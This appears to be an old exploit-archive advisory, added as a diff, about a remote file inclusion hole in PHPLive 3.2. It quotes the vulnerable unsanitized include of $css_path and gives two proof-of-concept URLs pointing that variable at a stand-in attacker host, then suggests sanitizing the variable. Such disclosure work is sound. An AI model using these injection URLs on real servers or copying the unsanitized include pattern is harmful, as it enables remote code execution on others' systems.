@@ -1,0 +1,45 @@
+     Advisory: PHPLive 3.2 Remote Injection Vulnerability
+ Release Date: 2006/07/23
+       Author: magnific
+   Discovered: aneurysm.inc security reserach
+         Risk: High
+Vendor Status: not contacted | no patch available
+  Vendor Site: www.osicodes.com
+      Contact: aneurysm_inc[at]hotmail[dot]com
+      Version: all
+
+-----------
+Overview:
+
+Some variables are not properly sanitized before being used.
+Here you will find the variables not properly sanitized:
+
+-----------
+Vulnerable code:
+
+help.php /setup/header.php etc..
+
+<? $css_path = ( !isset( $css_path ) ) ? $css_path = "./" : $css_path ; include_once( $css_path."css/default.php" ) ; ?>
+
+-----------
+Execution:
+
+help.php?css_path=htt://attacker
+setup/header.php?css_path=htt://attacker
+
+
+-----------
+Vendor:
+
+At the moment, there are no solutions from the vendor. If you want to make
+sure the code and your PHPLIVE you have to sanitize the variable $css_path,
+in all files affecteds.
+Active SAFE_MODE on server, for local security.
+
+---------------------------
+aneurysm.inc security reserach
+irc.gigachat.net
+#aneurysm.inc
+---------------------------
+
+# milw0rm.com [2006-07-23]
